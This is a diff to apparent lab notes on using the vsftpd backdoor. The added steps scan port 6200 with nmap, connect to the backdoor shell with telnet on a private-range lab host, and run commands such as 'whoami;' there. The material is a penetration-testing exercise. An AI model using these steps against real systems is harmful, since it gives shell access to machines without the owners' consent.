@@ -108,13 +108,20 @@ tape
 ```
 pass doesitmatter?
 ```
-retest port
+retest port in another terminal  (ctrl+shift+T)
 ```
 nmap -sS -p 6200 192.168.211.129
 ```
-Opening backdoor in another terminal (ctrl+shift+T)
+Opening backdoor 
 ```
 telnet  192.168.211.129 6200
+```
+command should be end by ;
+```
+whoami;
+```
+```
+dir;
 ```
 
 * Testing backdoor vsftpd : 
